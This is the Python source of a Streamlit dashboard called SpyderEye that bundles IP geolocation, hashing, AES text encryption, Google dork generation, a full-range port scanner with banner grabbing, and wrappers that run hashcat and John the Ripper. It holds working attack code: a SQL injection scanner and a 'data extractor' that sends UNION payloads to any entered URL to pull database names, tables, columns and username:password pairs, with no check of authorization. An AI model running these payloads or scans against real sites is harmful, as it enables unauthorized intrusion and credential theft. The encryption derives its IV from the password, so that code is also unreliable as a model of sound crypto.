import streamlit as st
import subprocess
import os
import re
import socket
import psutil
import requests
import pandas as pd
import pydeck as pdk
import hashlib
import base64
import ipaddress
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from datetime import datetime
import urllib.parse

# Setup Streamlit
st.set_page_config(page_title="🕵️ SpyderEye", layout="wide")
st.title("🕸️ Spyder eye")
# Sidebar Tool Selector (without Metadata Analyzer)
tool = st.sidebar.selectbox("Choose a Tool", [
    "Batch IP Tracker",
    "Local Network IP Tracker",
    "Custom IP Info Tracker",
    "File Hash Generator",
    "Advanced Secure Encoder/Decoder",
    "SQL Injection Tester",
    "Advanced SQL Injection Tool",
    "Google Dork Scanner",
    "Port Scanner",
    "Brute Force Password Cracker"
])
# Public IP Tracker
if tool == "Batch IP Tracker":
    st.subheader("🌐 Batch Public IP Tracker with Heatmap + Info")

    # ✅ Make sure this is before using ip_list_input
    ip_list_input = st.text_area("Enter IPs (one per line):")

    if st.button("📍 Track IPs"):
        ips = ip_list_input.strip().split("\n")
        data_points = []
        ip_info_list = []

        for ip in ips:
            try:
                res = requests.get(f"https://ipinfo.io/{ip.strip()}/json")
                data = res.json()
                loc = data.get("loc")
                if loc:
                    lat, lon = map(float, loc.split(","))
                    data_points.append({
                        "lat": lat,
                        "lon": lon,
                        "ip": ip.strip()
                    })

                    ip_info_list.append({
                        "IP": ip.strip(),
                        "City": data.get("city", "N/A"),
                        "Region": data.get("region", "N/A"),
                        "Country": data.get("country", "N/A"),
                        "Organization": data.get("org", "N/A"),
                        "Postal": data.get("postal", "N/A"),
                        "Timezone": data.get("timezone", "N/A")
                    })
            except Exception as e:
                st.warning(f"⚠️ Failed to fetch data for {ip.strip()}: {e}")

        if data_points:
            df = pd.DataFrame(data_points)

            # 🔥 Heatmap
            layer = pdk.Layer(
                "HeatmapLayer",
                data=df,
                get_position='[lon, lat]',
                aggregation='"MEAN"',
                opacity=0.8
            )

            view_state = pdk.ViewState(latitude=df["lat"].mean(), longitude=df["lon"].mean(), zoom=2)
            st.pydeck_chart(pdk.Deck(layers=[layer], initial_view_state=view_state))

            # 📋 Info Table
            st.subheader("📝 Detailed IP Info")
            st.dataframe(pd.DataFrame(ip_info_list))

        else:
            st.warning("⚠️ No valid locations found.")




# Local Network Tracker
elif tool == "Local Network IP Tracker":
    st.subheader("💻 Track Local Network Devices with Colored Map (Approximate)")

    if st.button("🔍 Scan LAN"):
        try:
            st.info("Scanning local network...")
            devices = []

            for interface, snics in psutil.net_if_addrs().items():
                for snic in snics:
                    if snic.family == socket.AF_INET:
                        ip = snic.address
                        if ip.startswith("127.") or ip.startswith("169.254."):
                            continue
                        devices.append((interface, ip))

            if devices:
                st.success("📱 Active Local Devices:")
                for interface, ip in devices:
                    st.write(f"💻 Interface: {interface} → IP: {ip}")

                loc_data = requests.get("https://ipinfo.io/json").json()
                loc = loc_data.get("loc", None)

                if loc:
                    lat, lon = map(float, loc.split(","))
                    df = pd.DataFrame([{ "lat": lat, "lon": lon, "info": "Approx Location of Your Local Network" }])

                    layer = pdk.Layer(
                        "ScatterplotLayer",
                        data=df,
                        get_position='[lon, lat]',
                        get_color='[0, 100, 255, 160]',
                        get_radius=50000,
                        pickable=True,
                    )

                    view_state = pdk.ViewState(latitude=lat, longitude=lon, zoom=4, pitch=0)
                    st.pydeck_chart(pdk.Deck(layers=[layer], initial_view_state=view_state, tooltip={"text": "{info}"}))
                else:
                    st.warning("❌ Could not retrieve public geolocation for private IP tracking.")

            else:
                st.warning("⚠️ No local devices detected.")

        except Exception as e:
            st.error(f"❌ Error scanning LAN: {str(e)}")

# Custom IP Tracker
elif tool == "Custom IP Info Tracker":
    st.subheader("🔎 Track Any IP Address (Public or Private)")

    ip_address = st.text_input("Enter any IP address:", "")

    if st.button("🔍 Track Custom IP"):
        try:
            ip_obj = ipaddress.ip_address(ip_address)
            if ip_obj.is_private:
                st.info(f"📄 {ip_address} is a **private IP address**.")
            elif ip_obj.is_global:
                st.info(f"🌐 {ip_address} is a **public IP address**. Attempting to retrieve location...")

                response = requests.get(f"https://ipinfo.io/{ip_address}/json")
                data = response.json()
                st.json(data)

                loc = data.get("loc", None)
                if loc:
                    lat, lon = map(float, loc.split(","))
                    df = pd.DataFrame([{ "lat": lat, "lon": lon, "info": f"Custom IP: {ip_address}" }])

                    layer = pdk.Layer(
                        "ScatterplotLayer",
                        data=df,
                        get_position='[lon, lat]',
                        get_color='[255, 165, 0, 160]',
                        get_radius=60000,
                        pickable=True,
                    )

                    view_state = pdk.ViewState(latitude=lat, longitude=lon, zoom=4, pitch=0)
                    st.pydeck_chart(pdk.Deck(layers=[layer], initial_view_state=view_state, tooltip={"text": "{info}"}))
                else:
                    st.warning("No location data found for this IP.")
            else:
                st.info(f"{ip_address} is neither private nor global.")
        except Exception as e:
            st.error(f"❌ Invalid IP or error: {str(e)}")

# File Hash Generator
elif tool == "File Hash Generator":
    st.subheader("🦬 File Hash Generator (MD5, SHA1, SHA256)")

    uploaded_file = st.file_uploader("Upload a file to hash:")
    if uploaded_file:
        content = uploaded_file.read()
        st.write("**MD5:**", hashlib.md5(content).hexdigest())
        st.write("**SHA1:**", hashlib.sha1(content).hexdigest())
        st.write("**SHA256:**", hashlib.sha256(content).hexdigest())

# Advanced Secure Encoder/Decoder
elif tool == "Advanced Secure Encoder/Decoder":
    st.subheader("🔐 Secure Text Encryptor / Decryptor (AES-256 CBC)")

    mode = st.radio("Choose Mode", ["Encrypt", "Decrypt"])
    password = st.text_input("🔑 Enter your password:", type="password")
    message = st.text_area("📝 Enter your message:")

    def derive_key_iv(password):
        hashed = hashlib.sha256(password.encode()).digest()
        return hashed[:32], hashed[16:32]

    def encrypt_message(msg, password):
        key, iv = derive_key_iv(password)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ct = cipher.encrypt(pad(msg.encode(), AES.block_size))
        return base64.b64encode(ct).decode()

    def decrypt_message(enc_msg, password):
        key, iv = derive_key_iv(password)
        enc_bytes = base64.b64decode(enc_msg)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(enc_bytes), AES.block_size)
        return pt.decode()

    if st.button("🚀 Process"):
        if not password or not message:
            st.warning("⚠️ Please enter both password and message.")
        else:
            try:
                if mode == "Encrypt":
                    result = encrypt_message(message, password)
                    st.success("✅ Encrypted Text:")
                else:
                    result = decrypt_message(message, password)
                    st.success("✅ Decrypted Text:")

                st.code(result)
                st.download_button("⬇️ Download Result", result, file_name="secure_text.txt")
            except Exception as e:
                st.error(f"❌ Error: {str(e)}")

# SQL Injection Scanner
elif tool == "SQL Injection Tester":
    st.subheader("🧪 Basic SQL Injection Vulnerability Scanner")

    target_url = st.text_input("Enter the target URL (with a parameter):", placeholder="e.g. http://example.com/page.php?id=1")
    test_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR '1'='1' -- ",
        "' OR '1'='1' /*",
        "' OR 1=1#",
        "1' AND 1=2 UNION SELECT null,null--",
    ]

    if st.button("🚨 Scan for SQLi"):
        if not target_url or "?" not in target_url or "=" not in target_url:
            st.warning("⚠️ Please enter a valid URL with a query parameter.")
        else:
            vulnerable = False
            st.info("🔎 Testing for SQL injection vulnerabilities...")

            for payload in test_payloads:
                test_url = re.sub(r"=([^&]*)", f"=\\1{payload}", target_url, count=1)
                try:
                    res = requests.get(test_url, timeout=5)
                    if any(err in res.text.lower() for err in ["sql syntax", "mysql", "unclosed quotation", "odbc", "query failed", "warning", "unterminated string", "sqlite"]):
                        st.error(f"🚨 Potential vulnerability found with payload: `{payload}`")
                        st.code(test_url)
                        vulnerable = True
                        break
                except Exception as e:
                    st.warning(f"⚠️ Error testing payload `{payload}`: {str(e)}")

            if not vulnerable:
                st.success("✅ No SQL injection vulnerabilities detected with basic tests.")
                
elif tool == "Advanced SQL Injection Tool":
    st.subheader("🧬 Advanced SQL Injection Data Extractor")

    target_url = st.text_input("🎯 Enter a vulnerable URL (with `id=` parameter):", placeholder="e.g., http://example.com/page.php?id=1")

    # Common payloads to extract basic data (assuming 2 columns)
    payloads = [
        "' UNION SELECT NULL, database()-- -",
        "' UNION SELECT NULL, user()-- -",
        "' UNION SELECT NULL, version()-- -",
        "' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database()-- -",
        "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'-- -",
        "' UNION SELECT NULL, concat(username, ':', password) FROM users-- -"
    ]

    if st.button("🚀 Launch Injection"):
        if not target_url or "?" not in target_url or "=" not in target_url:
            st.warning("⚠️ Please enter a valid URL with a query parameter.")
        else:
            st.info("🔎 Attempting data extraction via UNION SQL Injection...")

            extracted_data = []

            for payload in payloads:
                test_url = re.sub(r"=([^&]*)", f"=\\1{payload}", target_url, count=1)
                st.write(f"🔸 Testing: `{test_url}`")

                try:
                    response = requests.get(test_url, timeout=8)
                    lower_text = response.text.lower()
                    if any(keyword in lower_text for keyword in ["sql", "syntax", "error", "warning", "query", "mysql"]):
                        st.warning("⚠️ Error response suggests a potential injection point.")

                    # Try to extract visible text from the response
                    match = re.findall(r">([^<>]{4,})<", response.text)
                    if match:
                        for m in match:
                            if any(char.isalnum() for char in m):
                                extracted_data.append(m.strip())

                except Exception as e:
                    st.warning(f"⚠️ Error with payload `{payload}`: {str(e)}")

            if extracted_data:
                st.success("✅ Extracted Data:")
                st.code("\n".join(set(extracted_data)))
            else:
                st.error("❌ No data extracted. The site might be secure or require deeper fuzzing.")
 
# Google Dork Scanner
elif tool == "Google Dork Scanner":
    st.subheader("🔮 Google Dork Scanner")

    def is_valid_domain(domain):
        import re
        return re.match(r"^(?!-)(?:[a-zA-Z0-9-]{1,63}\.)+[a-zA-Z]{2,}$", domain)

    domain = st.text_input("🔍 Enter a domain (e.g., example.com):").strip()

    use_custom = st.checkbox("🧠 Use a custom dork query instead")

    if not use_custom:
        dork_type = st.selectbox("🧰 Select a Dork Type", [
            "Index of Files",
            "Exposed Login Pages",
            "Database Errors",
            "Publicly Exposed Documents",
            "Config Files",
            "Sensitive Directories"
        ])

        dork_queries = {
            "Index of Files": f'site:{domain} intitle:"index of"',
            "Exposed Login Pages": f'site:{domain} inurl:login',
            "Database Errors": f'site:{domain} "sql syntax near"',
            "Publicly Exposed Documents": f'site:{domain} ext:pdf | ext:doc | ext:xls | ext:ppt',
            "Config Files": f'site:{domain} ext:xml | ext:conf | ext:ini | ext:env',
            "Sensitive Directories": f'site:{domain} inurl:admin | inurl:dashboard'
        }

        if st.button("🔍 Generate Dork Query"):
            if not domain:
                st.warning("⚠️ Please enter a domain.")
            elif not is_valid_domain(domain):
                st.error("❌ Invalid domain format. Please enter something like `example.com`.")
            else:
                query = dork_queries.get(dork_type)
                search_url = f"https://www.google.com/search?q={urllib.parse.quote_plus(query)}"
                st.success("✅ Google Dork Generated:")
                st.code(query)
                st.markdown(f"[🔎 Search on Google]({search_url})")
                st.download_button("📥 Copy Query to Clipboard", query, file_name="google_dork.txt")
    else:
        custom_dork = st.text_area("🧬 Enter your custom dork query:")
        if st.button("🎯 Generate Search Link"):
            if not custom_dork.strip():
                st.warning("⚠️ Please enter your custom query.")
            else:
                search_url = f"https://www.google.com/search?q={urllib.parse.quote_plus(custom_dork.strip())}"
                st.success("✅ Custom Dork Generated:")
                st.code(custom_dork.strip())
                st.markdown(f"[🔎 Search on Google]({search_url})")
                st.download_button("📥 Copy Query to Clipboard", custom_dork.strip(), file_name="custom_dork.txt")
# Advanced Port Scanner
elif tool == "Port Scanner":
    st.subheader("🧠 Advanced Port Scanner")

    target = st.text_input("🔎 Enter target IP or domain:", placeholder="e.g., 192.168.1.1 or example.com")

    scan_mode = st.selectbox("🧰 Scan Mode", [
        "Top 100 Ports (Fast)",
        "Custom Port Range",
        "Full Scan (1–65535)"
    ])

    timeout = st.slider("⏱️ Timeout per port (in seconds)", 0.1, 5.0, 0.5, 0.1)

    if scan_mode == "Custom Port Range":
        port_range = st.text_input("📦 Enter custom range (e.g., 20-1024):", value="20-1024")

    def get_top_100_ports():
        # Based on nmap’s top ports list (sampled)
        return [
            21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723,
            3306, 3389, 5900, 8080, 8443, 10000, 8888, 554, 587, 1025, 1720, 5432, 8000,
            8181, 5000, 5060, 636, 873, 993, 113, 1521, 6667, 389, 179, 7001, 6001
        ]

    def parse_port_range(range_text):
        try:
            start, end = map(int, range_text.split("-"))
            return list(range(start, end + 1))
        except:
            return []

    def scan_ports(host, ports, timeout_val):
        open_ports = []
        banner_results = []
        scan_progress = st.progress(0)
        status = st.empty()

        for i, port in enumerate(ports):
            status.text(f"Scanning port {port}...")
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(timeout_val)
                    result = s.connect_ex((host, port))
                    if result == 0:
                        # Try grabbing banner
                        try:
                            s.sendall(b'HEAD / HTTP/1.1\r\nHost: %s\r\n\r\n' % host.encode())
                            banner = s.recv(1024).decode(errors='ignore').strip()
                        except:
                            banner = "No banner or service response."
                        open_ports.append(port)
                        banner_results.append((port, banner))
            except:
                pass
            scan_progress.progress((i + 1) / len(ports))

        return banner_results

    if st.button("🚀 Start Advanced Scan"):
        if not target:
            st.warning("⚠️ Please enter a target domain or IP.")
        else:
            try:
                resolved_ip = socket.gethostbyname(target)
                st.info(f"Scanning {resolved_ip}...")

                if scan_mode == "Top 100 Ports (Fast)":
                    ports = get_top_100_ports()
                elif scan_mode == "Custom Port Range":
                    ports = parse_port_range(port_range)
                else:
                    ports = list(range(1, 65536))

                results = scan_ports(resolved_ip, ports, timeout)

                if results:
                    st.success(f"✅ Open Ports on {resolved_ip}:")
                    for port, banner in results:
                        st.code(f"Port {port} open → {banner}")
                else:
                    st.warning("🔒 No open ports detected.")
            except Exception as e:
                st.error(f"❌ Scan failed: {str(e)}")
# Brute Force Password Cracker
elif tool == "Brute Force Password Cracker":
    st.subheader("🔓 Brute Force Password Cracker (Limited)")

    # Choose cracking tool: Hashcat or John the Ripper
    cracker_tool = st.selectbox("Choose Cracker Tool", [
        "Hashcat", 
        "John the Ripper"
    ])

    # File uploader for the hash file
    hash_file = st.file_uploader("Upload Hash File", type=["txt", "hash"])

    # File uploader for the wordlist
    wordlist_file = st.file_uploader("Upload Wordlist", type=["txt"])

    # Cracking button
    if st.button("🚀 Start Cracking"):
        if hash_file and wordlist_file:
            try:
                # Read hash file and wordlist file
                hash_file_content = hash_file.read().decode('utf-8')
                wordlist_content = wordlist_file.read().decode('utf-8')

                # Save uploaded content to files
                with open("hashes.txt", "w") as hash_file:
                    hash_file.write(hash_file_content)

                with open("wordlist.txt", "w") as wordlist:
                    wordlist.write(wordlist_content)

                # Based on the selected tool, run the appropriate command
                if cracker_tool == "Hashcat":
                    st.info("🚀 Running Hashcat...")

                    # Example: Run hashcat command for cracking hashes
                    hashcat_command = f"hashcat -m 0 -a 0 hashes.txt wordlist.txt"  # Adjust hash mode (-m) as per your hash type
                    st.text(f"Command: {hashcat_command}")

                    # Use subprocess to execute the command in the background
                    result = subprocess.run(hashcat_command, shell=True, capture_output=True, text=True)

                    # Display results
                    if result.returncode == 0:
                        st.success(f"✅ Cracking completed successfully!\n{result.stdout}")
                    else:
                        st.error(f"❌ Error: {result.stderr}")

                elif cracker_tool == "John the Ripper":
                    st.info("🚀 Running John the Ripper...")

                    # Example: Run John the Ripper command for cracking hashes
                    john_command = f"john --wordlist=wordlist.txt hashes.txt"  # Adjust the parameters as needed
                    st.text(f"Command: {john_command}")

                    # Use subprocess to execute the command in the background
                    result = subprocess.run(john_command, shell=True, capture_output=True, text=True)

                    # Display results
                    if result.returncode == 0:
                        st.success(f"✅ Cracking completed successfully!\n{result.stdout}")
                    else:
                        st.error(f"❌ Error: {result.stderr}")

            except Exception as e:
                st.error(f"❌ Error processing files: {str(e)}")
        else:
            st.warning("⚠️ Please upload both hash file and wordlist.")

st.markdown("<hr>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; font-size: 14px;'>Created by Sumit Kalamkar</p>", unsafe_allow_html=True)